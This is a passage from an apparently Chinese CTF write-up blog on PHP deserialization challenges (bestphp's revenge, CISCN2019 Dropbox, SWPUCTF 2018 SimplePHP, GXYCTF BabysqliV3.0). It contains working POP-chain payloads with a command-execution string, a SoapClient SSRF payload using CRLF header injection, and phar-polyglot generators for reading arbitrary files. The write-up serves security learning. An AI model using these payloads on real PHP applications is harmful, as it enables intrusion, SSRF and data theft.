class="title function_ invoke__">__invoke</span>()→fin::<span class="title function_ invoke__">__call</span>()→mix::<span class="title function_ invoke__">__get_flag</span>()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#重复用到了fin-&gt;f1和min-&gt;m1，所以有$mix2 = new mix();$fin2 = new fin();</span></span><br><span class="line"><span class="variable">$fin</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php echo `ls`;?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$fin</span>);</span><br></pre></td></tr></table></figure><h4 id="buu–bestphp‘s-revenge"><a href="#buu–bestphp‘s-revenge" class="headerlink" title="buu–bestphp‘s revenge"></a>buu–bestphp‘s revenge</h4><p>flag.php（目录扫描得到）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>; </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">&#123; <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>; &#125; </span><br><span class="line">only localhost can get flag! </span><br></pre></td></tr></table></figure><blockquote><p>本地请求访问flag.php时，会将flag写入session中</p><p>利用php原生类SoapClient可以构造ssrf，需要触发SoapClient::call。</p></blockquote><p>SoapClient：</p><p><a href="https://www.anquanke.com/post/id/153065#h2-1">https://www.anquanke.com/post/id/153065#h2-1</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>上面提到了要触发SoapClient::call。那么哪里可以实例化SoapClient对象呢？</p><blockquote><p>答案是在session中实例化。<a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p></blockquote><p><img src="/../images/20191026142328-1fba974c-f7b9-1-1687419234886.png" alt="img"></p><p>$_SESSION环境变量和服务器上的seission文件</p><blockquote><p>$_SESSION环境变量：保存实例化对象</p><p>在会话结束后将数据序列化保存到seission文件中。</p><p>会话开始后，会根据cookie中的phpsession_id将session文件（如果有）的内容反序列化保存到$_SESSION环境变量中。</p></blockquote><p>序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure><p>第一次，更改php的session引擎，通过序列化和反序列化时引擎的不同使下一次请求时session中保存的是我们构造的SoapClient对象。</p><p><img src="/../images/image-20220730203810430-1687419234886.png" alt="image-20220730203810430"></p><blockquote><p>POST ：serialize_handler&#x3D;php_serialize</p><p>GET    :   f&#x3D;session_start</p><p><code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>将session引擎设置为php_serialize（在下一次中生效）</p></blockquote><p>注：使用session_start设置引擎，而不是用ini_set来设置，因为session_start能够处理数组，而ini_set不行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(<span class="title function_ invoke__">arrary</span>(<span class="string">&#x27;serialize_handler&#x27;</span>=&gt;<span class="string">&#x27;php_serialize&#x27;</span>))</span><br></pre></td></tr></table></figure><blockquote><p>GET:   name&#x3D; |+序列化内容（记得在前面加上|）</p><p>$_SESSION[‘name’] &#x3D; $_GET[‘name’];</p><p>这时候session文件中保存的数据就是上图response中的。</p></blockquote><p>第二次，还是上一次的cookie，通过覆盖变量触发SoapClient::call方法</p><p><img src="/../images/image-20220730204831558-1687419234886.png" alt="image-20220730204831558"></p><blockquote><p>与上一次相同的cookie，服务器就会根据cookie找到我们构造的session文件，并将其内容反序列化保存到$_SESSION中，此时因为引擎的不同，反序列化后得到的就是构造好的SoapClient对象。</p></blockquote><p>触发SoapClient::call方法</p><blockquote><p>POST ：b&#x3D;call_user_func</p><p>GET    :   f&#x3D;extract</p><p><code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>即<code>extract($_POST)</code>→b&#x3D;call_user_func</p><p><code>$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);</code></p><p><code>call_user_func($b, $a);</code>即</p><p><code>call_user_func(call_user_func, arrary(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;))</code></p><p>即<code>call_user_func（arrary(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;)）</code></p><p>即调用了reset($_SESSION)中的’welcome_to_the_lctf2018’方法</p><p>而reset($_SESSION)即是SoapClient对象，没有’welcome_to_the_lctf2018’方法，就触发了SoapClient::call方法,从而将flag保存到我们构造的cookie所对应的session中。</p></blockquote><p>第三次，将cookie设置为我们构造的cookie，获得对应的session</p><p><img src="/../images/image-20220730212228972-1687419234886.png" alt="image-20220730212228972"></p><h3 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p>打开是登录页面，要么目标就是登录上去，要么就是登录后的功能有问题。</p><p>先找注册界面，有注册界面，那应该就是登陆后的功能有问题。</p><p>有一个文件上传，下载，删除功能。经测试，文件下载部分存在任意文件下载漏洞，通过此漏洞得到源码。</p><hr><p>代码审计：</p><p>因为buu上有phar标签，所以知道考的是phar。</p><p>反着找，先找文件函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php下</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span>::<span class="variable constant_">close</span>调用了<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename)触发phar反序列化</span><br><span class="line">所以要构造filename=flag所在路径</span><br></pre></td></tr></table></figure><p>再看哪里调用了close方法：</p><ol><li><p>download.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">21</span>,<span class="number">17</span>:     <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">但是这里限制了目录访问并过滤了flag，所以不能利用</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></li><li><p>class.php</p></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">User</span>::<span class="variable constant_">destruct</span></span><br><span class="line"><span class="number">57</span>,<span class="number">20</span>:         <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">所以猜测要让<span class="variable">$db</span>为File对象</span><br></pre></td></tr></table></figure><p>正着找</p><ol><li><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line">首先实例化了FileList类，然后调用了这个类中的Name和Size方法，但是FileList类中没有这两个方法，那么就会调用</span><br><span class="line">__call魔术方法</span><br></pre></td></tr></table></figure></li><li><p>查找FileList类是否有call方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Filelist</span>::<span class="variable constant_">call</span>：</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">__call方法的参数<span class="variable">$func</span>是被调用的不存在的方法名</span><br><span class="line">关注<span class="variable">$file</span>-&gt;<span class="variable">$func</span>()，调用了<span class="variable">$func</span>()</span><br></pre></td></tr></table></figure></li><li><p>$file是什么：往前看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">    <span class="comment">//知道$file是File对象</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">    <span class="comment">//知道files存放path下的所有文件对象($filenames = scandir($path);)</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line"> &#125;   </span><br></pre></td></tr></table></figure></li><li><p>回看call方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="comment">//results[文件名][方法名]=File::$func的结果</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以Filelist::call就是当Filelist对象调用的方法不在Filelist类时，将该方法用File类重载，并把执行结果保存到Filelist.results中。<br>所以如果Filelist对象调用了close方法，就相当于调用了File.close()。<br>所以$db应该为Filelist对象，这样就可以调用File.close()</p></li><li><p>继续向下看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)中关注</span></span><br><span class="line"><span class="function"><span class="title">foreach</span> (<span class="params"><span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">将方法结果保存到value即table中</span><br><span class="line">最后<span class="keyword">echo</span> <span class="variable">$table</span>;就相当于<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure></li><li><p>到这里思路就清晰了。</p></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">我们让User类中的<span class="variable">$db</span>为Filelist对象，当<span class="variable">$db</span>销毁时触发<span class="title class_">User</span>::<span class="title function_ invoke__">destruct</span>()方法，就会调用close方法，但是<span class="title class_">Filelist</span>::<span class="variable constant_">close</span>不存在，就会触发<span class="title class_">Filelist</span>::<span class="variable constant_">call</span>,从而调用<span class="title class_">File</span>::<span class="variable constant_">close</span>,执行<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>)，最后将结果返回输出。</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;<span class="comment"># 这里的flag.txt是多次猜测出来的</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#让User类中的$db为Filelist对象</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$filelist</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;db = <span class="variable">$filelist</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$user</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后将生成的phar.phar上传(直接修改文件后缀名后上传或者抓包修改content-type)为phar.gif，然后使用phar协议访问文件，有两个地方可以访问，download.php和delete.php，前面分析过dowmload.php对目录和文件名作了限制，所以使用delete.php来进行访问。</p><p><img src="/../images/image-20220708203217989-1687419234886.png" alt="image-20220708203217989"></p><h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>I&#x2F;O操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Test</span>::<span class="variable constant_">file_get</span></span><br><span class="line"><span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>))</span><br></pre></td></tr></table></figure><p>$value：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br></pre></td></tr></table></figure><p>$key：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__get魔术方法</span><br><span class="line">找读取不存在/保护的属性</span><br><span class="line"></span><br><span class="line">show::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">让str[<span class="string">&#x27;str&#x27;</span>]为Test类，然后Test类下没有source属性就会触发<span class="title class_">Test</span>::<span class="variable constant_">__get</span></span><br><span class="line">所以<span class="variable">$key</span>=source</span><br><span class="line">    </span><br><span class="line">__toString方法</span><br><span class="line">C1e4r下的__destruct <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">令test为show</span><br></pre></td></tr></table></figure><p>POP链</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C1e4r::__destruct → Show::__toString → Test::__get → Test::get  → Test::file_get </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//注意构造的顺序，从pop链尾到头</span></span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//生成的压缩文件名为test.phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h4><p><a href="https://blog.csdn.net/qq_54929891/article/details/124785091">https://blog.csdn.net/qq_54929891/article/details/124785091</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Uploader类</span></span><br><span class="line"><span class="comment"># 如果name有赋值，并通过过滤，filename==name，如果没有，则filename=$sandbox.$_SESSION[&#x27;user&#x27;].$ext</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"><span class="comment"># 返回name或者$sandbox.$_SESSION[&#x27;user&#x27;].$ext</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span 